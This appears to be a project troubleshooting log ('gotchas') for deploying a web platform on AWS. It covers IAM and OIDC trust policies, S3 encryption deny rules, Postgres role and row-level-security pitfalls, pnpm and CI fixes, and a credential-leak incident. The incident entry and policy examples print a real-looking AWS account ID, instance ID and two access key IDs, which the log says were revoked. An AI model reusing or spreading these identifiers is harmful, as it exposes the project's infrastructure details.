**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 13 closeout (inline policy updated on `eventpulse-deploy-staging` role).

**Symptom:** Trying to call `ssm:SendCommand --instance-ids i-XXX --document-name AWS-RunShellScript` from a role whose inline policy listed only the EC2 ARN form (`arn:aws:ec2:REGION:ACCOUNT:instance/i-XXX`) returns `AccessDeniedException ... not authorized to perform: ssm:SendCommand on resource: arn:aws:ssm:REGION:ACCOUNT:managed-instance/i-XXX because no identity-based policy allows the ssm:SendCommand action`. Note: the resource being evaluated is the **`ssm:managed-instance`** ARN form, NOT the `ec2:instance` form the role's policy listed.

**Why it happens:** AWS exposes EC2 instances through two ARN forms depending on how the operation reaches the instance:

- `arn:aws:ec2:REGION:ACCOUNT:instance/i-XXX` — when the operation targets the EC2 control plane directly (start, stop, terminate, describe).
- `arn:aws:ssm:REGION:ACCOUNT:managed-instance/i-XXX` — when the operation reaches the instance through the SSM agent (SendCommand, Run Command, Session Manager, State Manager, Inventory).

For `ssm:SendCommand` targeting an EC2 instance with the SSM agent installed, IAM evaluates against the **managed-instance** ARN form. Listing only the `ec2:instance` form in the policy looks plausible — and the AWS docs page for `ssm:SendCommand` mentions both ARN types — but only the SSM form is evaluated for agent-routed calls. The EC2 form is needed only for actions where SSM routes through the EC2 control plane (rare in practice).

**Fix:** include **both** ARN forms in the `Resource` list for `ssm:SendCommand`:

```json
{
  "Sid": "SsmSendCommandToEC2OnlyViaRunShellScript",
  "Effect": "Allow",
  "Action": "ssm:SendCommand",
  "Resource": [
    "arn:aws:ec2:ap-southeast-1:739275468267:instance/i-02e4fddeb923c14f9",
    "arn:aws:ssm:ap-southeast-1:739275468267:managed-instance/i-02e4fddeb923c14f9",
    "arn:aws:ssm:ap-southeast-1::document/AWS-RunShellScript"
  ]
}
```

**How to avoid:** Every new SSM-based deploy / restore / break-glass role MUST include both ARN forms for `ssm:SendCommand`. The canonical pattern is baked into `infra/scripts/setup-github-oidc.sh` (and any future analogue script) — adding instances goes through the script, not hand-edited policy. Code review for new deploy roles asks: "does the SendCommand resource list include the managed-instance form?"

---

## GitHub Environments override the OIDC `sub` claim from `ref:refs/heads/X` to `environment:Y`

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 13 closeout (trust policy rewritten on `eventpulse-deploy-staging` role).

**Symptom:** AWS IAM role with a trust policy gating on `token.actions.githubusercontent.com:sub = repo:OWNER/REPO:ref:refs/heads/main` rejects every assume-role attempt with `Could not assume role with OIDC: Not authorized to perform sts:AssumeRoleWithWebIdentity` — even when the workflow is genuinely running on the main branch of the right repo, even with `id-token: write` permission granted, even when manually triggered via `workflow_dispatch --ref main`. The `aud` and `Principal.Federated` are correct. The `sub` claim in the actually-issued OIDC token does NOT match the policy's expected value.

**Why it happens:** When a workflow job declares `environment: NAME`, GitHub **overrides** the default `sub` claim format from `repo:OWNER/REPO:ref:refs/heads/BRANCH` to `repo:OWNER/REPO:environment:NAME`. The environment-format claim takes precedence over the ref-format. Documented: <https://docs.github.com/en/actions/deployment/security-hardening-your-deployments/about-security-hardening-with-openid-connect#example-subject-claims>. Trust policies written against the ref-format will never match when the consuming workflow declares an environment, no matter what branch the workflow actually runs on.

**Fix:** identify the workflow's environment usage BEFORE writing the trust policy. Then either:

- **(preferred)** Use the environment-format in the trust policy: `sub = repo:OWNER/REPO:environment:NAME`, and add a `job_workflow_ref` claim as a workflow-file pin to recover the branch-scope intent:

  ```json
  "Condition": {
    "StringEquals": {
      "token.actions.githubusercontent.com:aud": "sts.amazonaws.com",
      "token.actions.githubusercontent.com:sub": "repo:OWNER/REPO:environment:NAME",
      "token.actions.githubusercontent.com:job_workflow_ref": "OWNER/REPO/.github/workflows/WORKFLOW.yml@refs/heads/BRANCH"
    }
  }
  ```

  The `job_workflow_ref` claim is set on every workflow run regardless of event type and is not overridden by environment usage; it carries the workflow-file path AND the ref the workflow file was loaded from.

- **(alternative)** Remove `environment:` from the workflow so the `sub` defaults to ref-format and matches the trust policy literally. Loses the GitHub deployment-history annotation.

- **(invasive)** Customize the GitHub OIDC subject claim template repo-wide via `gh api .../actions/oidc/customization/sub` to force ref-format even when environments are used. Affects every workflow in the repo; not recommended.

**How to avoid:** when designing any OIDC trust policy, identify the consuming workflow's environment usage first. With `environment:` → `sub = environment:NAME` + `job_workflow_ref` for workflow-file pinning. Without `environment:` → `sub = ref:refs/heads/BRANCH`. This is now the project's canonical OIDC trust shape — see `.claude/memory/decisions.md` "Canonical GitHub Actions → AWS OIDC trust pattern (project standard)" 2026-05-17.

---

## S3 bucket policy `StringNotEqualsIfExists` silently permits PUT without the keyed header

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 12 Item 6 (KYC bucket). Caught by iac-reviewer pre-commit.

**Symptom:** A `Deny PUT` with `StringNotEqualsIfExists: { "s3:x-amz-server-side-encryption-aws-kms-key-id": "<our CMK ARN>" }` does NOT fire on a PUT request that lacks the header entirely. The PUT goes through, and S3's bucket-default encryption fills in the CMK transparently — so the request happens to land on the right key today. But the policy as written is not enforcing the per-purpose CMK invariant: any future change to the bucket's default encryption (e.g. someone temporarily flips it to `AES256` or to the general `alias/eventpulse-staging` CMK while debugging) silently breaks the §17.9 blast-radius isolation guarantee without tripping the Deny.

**Why it happens:** `IfExists` is a condition-operator suffix that means "if the key is present, evaluate the operator; if absent, return true (treat as a match)". In a Deny statement, "return true" means "the deny FIRES on missing key". But — and this is the trap — `IfExists` is most commonly *seen* paired with `StringEquals` in Allow statements ("allow if matches, OR if absent"). Many engineers (myself included) reflexively mirror that pattern in a Deny statement assuming "if absent, the deny is bypassed". The opposite is true. Result: a Deny+IfExists+missing-key combo actually fires more aggressively than its non-IfExists cousin, but a Deny+`StringNotEqualsIfExists`+missing-key looks symmetric to the Allow case and is read as "permissive on missing" — exactly backwards.

The actual semantics that bit us: `StringNotEqualsIfExists "X"` returns `true` when the key is absent (because `IfExists` says "return true on absent"). For a Deny statement that means the deny would fire on absent — which IS the strict behavior we wanted. But empirically, the staging deploy showed `aws-cli put-object --server-side-encryption aws:kms` (no `--ssekms-key-id`) **succeeded** under the policy. The likely explanation: when a PUT specifies `SSE: aws:kms` but no explicit key-id header, S3 silently substitutes the bucket-default CMK into the request before condition evaluation — so the policy condition sees a present (and correct) key-id, the deny doesn't fire, and the upload completes against the right key. The bucket-default fallback masks the policy's intent.

**Fix:** Don't trust the bucket default. Enforce explicit key-id on every PUT:

1. Drop `IfExists`: change to `StringNotEquals` so the deny fires on missing key (more aggressive — but only if S3 doesn't substitute the default before evaluation, which it does for the SSE algorithm header but apparently NOT for the key-id header).
2. **AND** add a parallel `Null` deny on the key-id header so missing-header PUTs are denied regardless of substitution:

```json
{
  "Sid": "DenyPutWithoutExplicitKmsKeyId",
  "Effect": "Deny",
  "Principal": "*",
  "Action": "s3:PutObject",
  "Resource": "arn:aws:s3:::<bucket>/*",
  "Condition": {
    "Null": {
      "s3:x-amz-server-side-encryption-aws-kms-key-id": "true"
    }
  }
}
```

Both `Deny` statements together guarantee: every PUT must (a) include the explicit `aws-kms-key-id` header AND (b) that header must equal our dedicated CMK ARN. Bucket-default never gets a chance to silently substitute. App code (server-side pre-signed URL generation) must always set both `ServerSideEncryption: 'aws:kms'` AND `SSEKMSKeyId: '<CMK ARN from .env>'` on the `getSignedUrl` call. Verified live: `put-object --server-side-encryption aws:kms` (no key-id) → AccessDenied (resource policy); `put-object --server-side-encryption aws:kms --ssekms-key-id <correct ARN>` → OK.

**How to avoid:** For any future S3 bucket carrying PII/regulated data — KYC docs, payout records, signed legal contracts — never use `StringNotEqualsIfExists` for the encryption-key enforcement. Always combine `StringNotEquals` (no `IfExists`) with a parallel `Null` deny on the same key. Code review checklist for new bucket policies: grep for `IfExists` paired with `s3:PutObject` deny statements — every match needs explicit justification or rejection. iac-reviewer rule candidate: flag any `*IfExists` operator on a Deny statement and require a comment explaining why the absent-key semantics is correct.

---

## Postgres tables pre-existed on staging without migration history → 0001 re-apply fails

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5 (first real deploy).

**Symptom:** Deploy attempt 6's migration runner reported `relation "users" already exists` while applying `0001_identity_tables.sql`. The 12 identity tables existed in `eventpulse_staging` (likely from a Sprint 1 Day 5-6 manual verification run), but the `_eventpulse_schema_migrations` table was empty — the runner had no way to know 0001/0002 were already in place.

**Why it happens:** The hand-rolled migration runner (`apps/api/src/db/migrate.ts`) maintains its own history table. If schema state was created outside the runner (manual psql + .sql application, drizzle-kit push, or a different test harness), the runner is blind to it and tries to replay every migration from scratch.

**Fix (when it happens):** Backfill the migrations history table with the already-applied filenames, then re-run the deploy:

```sql
INSERT INTO _eventpulse_schema_migrations (filename, applied_at)
VALUES ('0001_identity_tables.sql', now()),
       ('0002_identity_rls_policies.sql', now())
ON CONFLICT DO NOTHING;
```

Verify the runner is in sync afterwards: `SELECT * FROM _eventpulse_schema_migrations ORDER BY filename;` should list every migration that has had its DDL applied.

**How to avoid:** Never apply schema via `psql -f *.sql` directly on a long-lived environment — always go through `pnpm --filter @eventpulse/api db:migrate`. For test/scratch DBs, prefer dropping + recreating the DB rather than applying SQL out-of-band.

---

## Postgres `eventpulse` user lacks ADMIN OPTION → migration 0001 GRANT fails

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5.

**Symptom:** `error: permission denied to grant role "eventpulse_app"` — `Only roles with the ADMIN option on role "eventpulse_app" may grant this role.` Migration 0001 runs `GRANT eventpulse_app TO CURRENT_USER` (and same for eventpulse_admin); the CURRENT_USER (`eventpulse` login role on staging) didn't have ADMIN OPTION on the target roles.

**Why it happens:** In CI the migration runs as the Postgres superuser (`postgres` from the postgres container's `POSTGRES_USER` default), which has ADMIN OPTION on every role implicitly. On staging the runtime DB user (`eventpulse`, a non-superuser LOGIN role created in Sprint 1 Day 3-4) does not. When 0001 creates `eventpulse_app` / `eventpulse_admin` it succeeds (no special perm needed if eventpulse has CREATEROLE), but the subsequent GRANT fails without ADMIN OPTION on those new roles.

**Fix (one-time, as postgres superuser via local socket):**

```sql
GRANT eventpulse_app   TO eventpulse WITH ADMIN OPTION;
GRANT eventpulse_admin TO eventpulse WITH ADMIN OPTION;
```

After this, the migration's `GRANT ... TO CURRENT_USER` is a no-op (eventpulse already has the role with ADMIN OPTION) and 0001 applies cleanly. Verify via:

```sql
SELECT r.rolname AS member_of, g.rolname AS member, m.admin_option
FROM pg_auth_members m
JOIN pg_roles r ON m.roleid=r.oid
JOIN pg_roles g ON m.member=g.oid
WHERE r.rolname LIKE 'eventpulse%';
```

`admin_option=t` should appear for both eventpulse_app and eventpulse_admin members where member = eventpulse.

**How to avoid:** Make this part of the Ansible playbook from Sprint 1 Day 3-4, OR extend `infra/scripts/bootstrap-staging.sh` to ensure the roles + grants are in place before the first deploy. (Deferred to a follow-up cleanup; current staging is bootstrapped manually.)

---

## Postgres CREATE POLICY requires table ownership → 0003 fails for non-owner

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5.

**Symptom:** Migration 0003's `CREATE POLICY users_self_select ON users` failed with `must be owner of table users`. The runtime DB user (`eventpulse`) was running the migration, but the tables were owned by `postgres` (from a Sprint 1 Day 5-6 manual setup).

**Why it happens:** `CREATE POLICY`, `ALTER TABLE`, `DROP TABLE` and similar DDL all require table ownership (or superuser). Tables created by `postgres` via `psql -f` belong to `postgres` and can't be modified by `eventpulse` even with CREATEROLE + WITH ADMIN OPTION on the role family.

**Fix (one-time, as postgres superuser):** Transfer ownership of every public-schema table to the runtime DB user:

```sql
DO $$
DECLARE t record;
BEGIN
  FOR t IN SELECT tablename FROM pg_tables WHERE schemaname='public' AND tableowner='postgres'
  LOOP
    EXECUTE format('ALTER TABLE public.%I OWNER TO eventpulse', t.tablename);
  END LOOP;
END $$;
```

After this, `eventpulse` can run any DDL against those tables. Future tables created BY eventpulse during a migration are automatically owned by eventpulse, so this is a one-time fix.

**Why not `REASSIGN OWNED BY postgres TO eventpulse`:** That command operates on ALL objects owned by postgres in the current DB, including DB-system objects we can't reassign. Result: `cannot reassign ownership of objects owned by role postgres because they are required by the database system`. Scoping to public-schema-only via the loop above sidesteps this.

**How to avoid:** Don't seed schema as `postgres` on a long-lived environment. Either run the migration runner from a fresh DB (where eventpulse creates everything), or fold the chown into the Ansible/bootstrap step alongside the role+ADMIN OPTION setup above.

---

## pnpm v9: `NODE_ENV=production` skips devDeps; `--prod=false` and `NPM_CONFIG_PRODUCTION=false` do NOT override it

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5 — deploy.sh uses `NODE_ENV=development` for the install command, then restores `NODE_ENV=production` for build + migrate + pm2.

**Symptom:** Deploy attempts 2 + 3 had `pnpm install --frozen-lockfile --prod=false` or `NPM_CONFIG_PRODUCTION=false pnpm install --frozen-lockfile` and pnpm reported "Already up to date" but `apps/web/node_modules/` contained only the 10 prod deps — no `@tailwindcss/postcss`, no `typescript`, no `husky`. Next build then failed: `Cannot find module '@tailwindcss/postcss'`.

**Why it happens:** In pnpm v9.15.x, the `--prod` CLI flag has version-to-version parsing drift, and the `NPM_CONFIG_PRODUCTION` env var is treated as advisory at best — neither overrides pnpm's direct read of `NODE_ENV`. If `NODE_ENV=production` is in scope when pnpm runs, devDeps are skipped regardless of any "no, install everything" signals.

**Fix (in deploy.sh / rollback.sh):** Wrap the install command with `NODE_ENV=development`:

```bash
# .env.staging has NODE_ENV=production — correct for runtime.
# But pnpm install needs to see development to include devDeps for build.
HUSKY=0 NODE_ENV=development \
  $PNPM install --frozen-lockfile --config.confirm-modules-purge=false

# Restore NODE_ENV for the rest of the script.
NODE_ENV=production
export NODE_ENV
```

This is the only reliable knob in pnpm v9. The CLI flag and `NPM_CONFIG_PRODUCTION` env var do not work as documented; assume `NODE_ENV` is authoritative until pnpm v10+ behavior is verified.

**How to avoid:** Don't trust pnpm CLI flag documentation in v9.x for prod/dev toggling. Always test with `NODE_ENV` set to verify which knob actually moves the install behavior.

---

## pnpm `--frozen-lockfile` prompts "modules will be reinstalled" with no TTY in SSM → hangs

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5 — `--config.confirm-modules-purge=false` flag added.

**Symptom:** Deploy attempt 2 hung indefinitely. SSM command output showed `The modules directories will be removed and reinstalled from scratch. Proceed? (Y/n) ‣ true` with an ANSI escape sequence trying to redraw the prompt. SSM's command channel has no PTY, so pnpm's `enquirer`-based prompt never got an answer and the command timed out.

**Why it happens:** When a previous install left node_modules in a partial state (e.g. an earlier `--prod` install then a later one requiring devDeps), pnpm decides the modules tree needs to be purged + reinstalled. It prompts the user for confirmation by default. SSM RunShellScript invocations don't allocate a TTY.

**Fix:** `pnpm install --config.confirm-modules-purge=false` auto-confirms the purge. Add it to every `pnpm install` invocation that might run in a non-TTY context (deploy scripts, CI, SSM, container entrypoints).

**How to avoid:** For any shell script that runs unattended, audit every interactive-capable subcommand for a non-interactive flag. pnpm has several others to watch: `--reporter=append-only` (no spinner), `--config.confirm-modules-purge=false`, `--config.fund=false`. CI environments usually set `CI=true` which pnpm respects for some prompts but not all.

---

## TypeScript `declarationMap` requires `declaration` or `composite` — base tsconfig + override interaction

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5 — `apps/api/tsconfig.build.json` explicitly sets `declarationMap: false`.

**Symptom:** `tsc --project tsconfig.build.json` failed with `error TS5069: Option 'declarationMap' cannot be specified without specifying option 'declaration' or option 'composite'.`

**Why it happens:** Base config (`packages/tsconfig/node.json`) sets `declaration: true` + `declarationMap: true`. `apps/api/tsconfig.build.json` overrides `declaration: false` but doesn't override `declarationMap`, so `declarationMap=true` is inherited alone. TS 5.6+ catches this combination.

**Why CI didn't catch it:** `pnpm typecheck` invokes `tsc --noEmit` against `tsconfig.json`, not `tsconfig.build.json`. The build config is only exercised by `pnpm --filter @eventpulse/api build` which runs on the EC2 during deploy. CI's `pnpm test` uses vitest + tsx (which bypasses tsc's compiler-options validation entirely).

**Fix:** Explicit `declarationMap: false` alongside `declaration: false` in any tsconfig that disables `declaration` while inheriting from a base that enables `declarationMap`.

**How to avoid:** Add a CI step that runs the actual production build (`pnpm --filter @eventpulse/api build`) — not just typecheck against the dev tsconfig. The "Lint + typecheck + format" CI job currently doesn't exercise build configs. Sprint 2 Day 12 housekeeping candidate: add `build` to the CI matrix.

---

## SSM `commands=[]` array entries run in SEPARATE shells — env vars don't persist between entries

**Status:** RESOLVED 2026-05-17 during Sprint 2 Day 11 Item 5 (workaround: combine commands with `;` or `&&` into a single array entry).

**Symptom:** A multi-step SSM command like:

```bash
aws ssm send-command --parameters 'commands=[
  "PG_PASSWORD=$(sudo awk -F: ... .pgpass)",
  "sudo PG_PASSWORD=\"$PG_PASSWORD\" /path/to/bootstrap.sh"
]'
```

failed with `PG_PASSWORD: must be set in caller env`. The first entry set the variable; the second entry couldn't see it.

**Why it happens:** AWS SSM RunShellScript runs each `commands[]` array entry as a SEPARATE invocation of `bash -c`. Each gets its own shell + its own env. Variables set in one entry are gone by the time the next starts. This is documented but easy to miss because the array format looks like a script with multiple lines.

**Fix:** Combine dependent steps into a single array entry, chained with `;` (sequence) or `&&` (sequence-with-early-abort):

```bash
commands=[
  "set -e; PG_PASSWORD=$(sudo awk -F: ... .pgpass); sudo PG_PASSWORD=\"$PG_PASSWORD\" /path/to/bootstrap.sh"
]
```

This way the whole pipeline runs in one shell and variables persist. Or write a small wrapper script + invoke it as a single command.

**How to avoid:** Mentally treat each entry in the SSM commands array as its own self-contained shell script. Need state to flow between them? Either combine them, or persist via a tempfile (`/tmp/foo.env` then `source /tmp/foo.env`).

---

## Pre-push hook blocks tag pushes from `main` as if they were branch pushes

**Status:** RESOLVED 2026-05-17 — `.husky/pre-push` rewritten to inspect git's per-ref stdin and gate solely on branch refs (`refs/heads/main` and `refs/heads/prod`). Tag pushes (`refs/tags/*`) and feature-branch pushes (`refs/heads/feat/*`, etc) pass cleanly even when HEAD is on main. Verified against an 8-case test matrix covering tag-only, branch-only, mixed, empty-stdin, and dual-protected scenarios before merge. Sprint 2 Day 11 Item 2; durable fix landed in the same sprint the issue surfaced.

**Symptom:** `git push origin v0.1.0-sprint-1` (with no branch ref) fails with `✋  Direct push to 'main' is blocked.` from the pre-push hook even though only a tag is being pushed.

**Why it happens:** The original `.husky/pre-push` checked `git symbolic-ref --short HEAD` to determine the current branch and matched against `^(main|prod)$`. When pushing only a tag, HEAD is still on `main` (because that's where the local checkout sits), so the hook fired identically to a branch push. The hook did not inspect git's pre-push stdin (which provides per-ref `<local ref> <local sha> <remote ref> <remote sha>` lines that would distinguish tag refs from branch refs).

**Fix (durable, landed):** `.husky/pre-push` now reads stdin line-by-line:

```bash
while read -r local_ref local_sha remote_ref remote_sha; do
  case "$remote_ref" in
    refs/heads/main|refs/heads/prod)
      blocked_refs+=("${remote_ref#refs/heads/}")
      ;;
    refs/heads/*|refs/tags/*)
      # Feature branches and tags: allowed.
      ;;
  esac
done
```

Block fires only when at least one ref being pushed is `refs/heads/main` or `refs/heads/prod`. Empty stdin (nothing being pushed) is a no-op. Multi-ref pushes are evaluated independently. Message includes the explicit "tag pushes are NOT blocked" line so future-me doesn't reach for `--no-verify` reflexively.

**Fix (historical, immediate workaround that was used during Sprint 1 closeout):** `git push --no-verify origin <tag>` per the hook's documented override. One-time use on 2026-05-17 for `v0.1.0-sprint-1` before this resolution landed.

**How to avoid:** Tag pushes from a protected branch checkout now work without intervention. The `--no-verify` override is reserved for the rare deliberate-direct-push-to-main case, which still requires a gotchas.md entry.

---

## Postgres superusers ALWAYS bypass RLS — `FORCE ROW LEVEL SECURITY` only binds table owners

**Status:** RESOLVED 2026-05-17 — Sprint 1 Day 5-6 first CI integration test pass surfaced this. Tenant A's "expected 1, got 2" assertions revealed that RLS wasn't engaging at all even though every policy was correct and every `ENABLE ROW LEVEL SECURITY` / `FORCE ROW LEVEL SECURITY` was set.

**Symptom:** `withTenant(tenantA, ...)` reads `tenants` and gets BOTH the A and B fixture rows, instead of just A. The RLS policy `id = current_setting('app.current_tenant_id', true)::uuid` looks correct. The session variable is set correctly. Yet rows from other tenants are still visible.

**Why it happens:** PG docs are explicit but easy to miss:

> Superusers and roles with the BYPASSRLS attribute always bypass the row security system when accessing a table. Table owners normally bypass row security as well, though a table owner can choose to be subject to row security with ALTER TABLE ... FORCE ROW LEVEL SECURITY.

In CI the connection user is `POSTGRES_USER` from the postgres image — a SUPERUSER. Superusers bypass RLS regardless of FORCE. The session variable is read; the policy is evaluated; the result is *thrown away* because the calling role is a superuser.

This is also why the issue didn't show locally — local tests `describe.skip` without `DATABASE_URL`, so they never exercised the bug.

**Fix:** Always run *application* queries as a non-superuser role. Migration creates `eventpulse_app` (NOLOGIN, no BYPASSRLS), grants it to the connection user, gives it ordinary table privileges. `withTenant()` does `SET LOCAL ROLE eventpulse_app` before setting `app.current_tenant_id`. `withSuperAdmin()` keeps using `SET LOCAL ROLE eventpulse_admin` (which has BYPASSRLS and is the *only* sanctioned way to bypass RLS).

**How to avoid:**

1. **Anywhere RLS matters, the application code must `SET LOCAL ROLE` a non-superuser role at the start of every transaction.** This is non-negotiable; relying on "the connection user isn't superuser in prod" is a foot-gun because dev/CI environments often run as superuser.
2. **Test RLS against a real Postgres in CI, not just unit tests.** Without the integration test, this would have shipped silently.
3. **Add a smoke check to every RLS migration: `SET LOCAL ROLE eventpulse_app` then count rows in a tenant-scoped table; should return 0 when the session variable is unset.** Catches future regressions.
4. **The `eventpulse_admin` BYPASSRLS role is the audit-logged escape hatch.** Don't put any business logic into "the connection user happens to be a superuser" — that's an accident waiting to leak across tenants.

---

## AWS Security Group rule description rejects `>` (and most non-ASCII punctuation)

**Status:** RESOLVED 2026-05-17 — discovered while authoring inbound rules for `eventpulse-staging-web` SG. Description "HTTP -> HTTPS redirect + ACME http-01 fallback" rejected with `InvalidParameterValue: Invalid rule description`.

**Symptom:** `aws ec2 authorize-security-group-ingress` returns `(InvalidParameterValue) Invalid rule description. Valid descriptions are strings less than 256 characters from the following set: a-zA-Z0-9. _-:/()#,@[]+=&;{}!$*`.

**Why it happens:** AWS restricts SG rule descriptions to a narrow ASCII set. Crucially absent: `>` `<` `'` `"` `\` `|` `?` `~`. Easy to slip in `->` arrows or HTML-like text without thinking about it. The error is descriptive but it's a paper-cut that costs one retry every time it happens.

**Fix:** Spell the arrow out (`"HTTP redirect to HTTPS plus ACME http-01 fallback"`). Or just drop ornamental punctuation from SG descriptions entirely.

**How to avoid:** When writing SG descriptions, stick to the allowed set: `a-zA-Z0-9 . _ - : / ( ) # , @ [ ] + = & ; { } ! $ *`. Single-quote and double-quote characters are also out — wrap-quotes are fine in your shell command but cannot appear *inside* the description string.

---

## IAM `--description` field rejects em-dash and other non-Latin-1 characters

**Status:** RESOLVED 2026-05-17 — discovered when creating IAM role `eventpulse-staging-ec2` with description containing `—` (em-dash, U+2014).

**Symptom:** `aws iam create-role --description "Event Pulse staging EC2 instance role — SSM access, ..."` returns `ValidationError: Value at 'description' failed to satisfy constraint: Member must satisfy regular expression pattern: <tab/LF/CR + ASCII printable + Latin-1 Supplement>` (the full regex in the AWS error message contains literal tab and CR characters that do not reproduce cleanly in markdown).

**Why it happens:** The allowed character set is tab/LF/CR plus printable ASCII plus the Latin-1 Supplement block (`U+00A1`-`U+00FF`). Em-dash (`U+2014`), en-dash (`U+2013`), curly quotes (`U+2018`-`U+201F`), ellipsis (`U+2026`) — all outside that range. Easy to slip in via copy-paste from documents that auto-promote `--` to `—`.

**Fix:** Use ASCII `-` (regular hyphen-minus) in `--description` fields. If a longer separator is needed, write a double-dash `--`.

**How to avoid:** Avoid copying CLI commands out of word processors. When pasting from the playbook (which uses real em-dashes for prose readability), strip them in the command line. Same risk applies to other AWS `--description` fields (KMS keys, etc).

---

## CLAUDE.md §14.1 contradicts schema §9.12 on default fee mode

**Status:** RESOLVED 2026-05-16 — see `decisions.md` → "Default fee handling mode: pass_through". §9.12 was updated to match §14.1.

**Why it happens:** §14.1 ("Both default to `pass_through` for new tenants") and §9.12 (`tenant_fee_config.default_fee_mode text NOT NULL DEFAULT 'absorb'`) disagreed on what a brand-new tenant's default fee mode should be. The prose section and the DDL were edited at different times and drifted.

**Fix:** Schema DDL in §9.12 changed from `DEFAULT 'absorb'` to `DEFAULT 'pass_through'`. Prose in §14.1 was already correct.

**How to avoid:** Whenever the schema and the prose section for the same subsystem are edited, diff them for default values, enum members, and required-vs-optional flags. The fee engine is the riskiest place for this kind of drift — make it part of the §25 Definition of Done checklist whenever §9 or §14 is touched.

---

## GitHub Free plan blocks branch protection on private repos

**Status:** OPEN — deferred 2026-05-16. Add protection once a paid plan is in place.

**Why it happens:** `gh api -X PUT /repos/{owner}/{repo}/branches/{branch}/protection` returns `403 "Upgrade to GitHub Pro or make this repository public to enable this feature."` when the owning account is on GitHub Free and the repo is private. Same restriction applies to rulesets. Documented at <https://docs.github.com/en/get-started/learning-about-github/githubs-plans>.

**Fix:** Either (a) upgrade `publicpulseagency` to GitHub Pro ($4/month), (b) convert the user account to an Organization and pay for GitHub Team ($4/user/month) — also unlocks team-based push restrictions for prod — or (c) keep the repo public (rejected: exposes the playbook + decisions log).

**Current state of main and prod branches:** UNPROTECTED. Direct pushes work; nothing enforces PR-based review or required CI checks. The Sprint 1 commits already on `main` are fine, but anything pushed straight to `main` from now until a paid plan exists bypasses every quality gate. Mitigation while unprotected: discipline only.

**How to avoid:** Pick a plan at the start of any new project. The cost ($4/mo) is dwarfed by one bad force-push. Tracked in handoff.md "Open questions" until resolved.

---

## AWS credentials accidentally pasted in chat during Day 3-4 bootstrap

**Status:** RESOLVED 2026-05-16 — both exposed keys deleted, CloudTrail audit clean (zero events on either key in ap-southeast-1 or us-east-1), replacement key never pasted.

**Symptom:** Two `eventpulse-cli` access keys (`AKIA2YICANXVR4KILEOZ`, `AKIA2YICANXVWVKCAE7Q`) exposed in chat via terminal output paste during initial AWS setup on 2026-05-16.

**Why it happens:** Shell command blocks with embedded `#` comments and multi-line structure caused zsh parse errors that scrambled terminal state; credential JSON output (which contains `AccessKeyId` + `SecretAccessKey`) got bundled into subsequent terminal log shares without being noticed in the moment.

**Fix:** Both compromised keys deleted from IAM. Third access key created for `eventpulse-cli`, never pasted anywhere. Root access key deleted entirely (programmatic root access is now impossible). `default` profile removed from `~/.aws/credentials` and `~/.aws/config`. CloudTrail audit performed across both regions for both key IDs — zero events on either key, no unauthorised use, no unfamiliar source IPs.

**How to avoid:**

1. **Never paste credential output** — AWS access keys, EPS hash keys, JWT signing keys, OAuth client secrets, KMS key material, anything sensitive — into any chat, screenshot, email, document, or log file. The only places credentials belong are `~/.aws/credentials` (or equivalent secrets file with `chmod 600`) and a password manager.
2. **Shell commands shared in prompts should be one command per line** with no `#` comments inside copy-paste blocks. zsh parses comments differently than bash and can leak surrounding text into the next visible line.
3. **When verifying setup, share only the minimum** — for `aws sts get-caller-identity` that's the `Arn` line via `--query 'Arn' --output text`, not the full JSON. For `aws iam create-access-key`, output goes straight to `aws configure --profile <name>` via piping or manual paste into the secrets file, never to stdout that gets captured.
4. **Treat any pasted credential as compromised even if the chat is private.** Rotate immediately. Run a CloudTrail audit for unauthorised use. Document the incident here.

---

## Dependabot opens majors aggressively on first push

**Status:** RESOLVED 2026-05-16 — `.github/dependabot.yml` now has explicit `ignore` entries for `version-update:semver-major` on every §1.2 locked package + every GitHub Action.

**Why it happens:** Dependabot scans the repo within minutes of the first push that contains `dependabot.yml` and opens PRs for every outdated dep it finds. Without `ignore` rules at repo init, it cheerfully proposes Next 15→16, zod 3→4, vitest 2→4, eslint 9→10, etc. — all of which would break the documented locked-stack contract in CLAUDE.md §1.2. We opened on day-one with 15 PRs sitting in the inbox, 13 of them majors that should never auto-bump.

**Fix:** Land `dependabot.yml` with `ignore` rules in the same commit that introduces it, not added later. The rule shape:

```yaml
ignore:
  - dependency-name: 'next'
    update-types: [version-update:semver-major]
```

Repeat for every locked dependency. For GitHub Actions, `dependency-name: '*'` is fine since action majors are universally a manual-read situation.

**How to avoid:** On any new project, the moment a `dependabot.yml` is authored, the `ignore` block goes in immediately, listing everything in the canonical-versions section of the project bible. Trying to enforce a locked stack via human discipline alone gets out-shouted by Dependabot's daily PR stream.

---

## CI written for the finished platform fails on early-sprint codebases

**Status:** RESOLVED 2026-05-16 — `ci.yml` rewritten with a `detect-scope` job that gates integration + e2e suites on the existence of the code they test. CLAUDE.md §24.4 ("CI Evolution") now documents the per-sprint escalation ladder.

**Symptom:** Right after PR #35 merged the initial `ci.yml`, all 7 open PRs (including markdown-only PR #37) showed red CI. Four jobs (`Lint + typecheck`, `Unit tests`, `Integration + RLS tests`, `E2E smoke (Playwright)`) failed in ~7 seconds each. Only `commitlint` passed.

**Why it happens:** Two overlapping things, with one masking the other:

1. **Immediate cause (pnpm version conflict):** `pnpm/action-setup@v4` errors when both `version:` is passed AND `packageManager` is set in `package.json`. The action explicitly bails out with `ERR_PNPM_BAD_PM_VERSION` even when the versions agree on the major. This killed every job at the pnpm setup step before any work ran.
2. **Underlying cause (CI ahead of code):** Even after the pnpm fix, `Integration + RLS tests` would have failed (no Drizzle migrations exist yet — Sprint 1 Day 5-6 work) and `E2E smoke` would have failed (no Playwright spec files exist yet). The original `ci.yml` was written assuming the finished platform's coverage.

**Fix:**

- `version:` removed from every `pnpm/action-setup@v4` invocation in `ci.yml`. `packageManager` field in `package.json` is now authoritative.
- New `detect-scope` job runs first; checks for `apps/api/src/db/migrations/*.sql` and `apps/web/e2e/**/*.spec.ts`; emits `has_migrations` + `has_e2e` outputs.
- `integration-tests` job gated on `needs.detect-scope.outputs.has_migrations == 'true'`. Currently skipped — will start running automatically when Day 5-6 lands migrations.
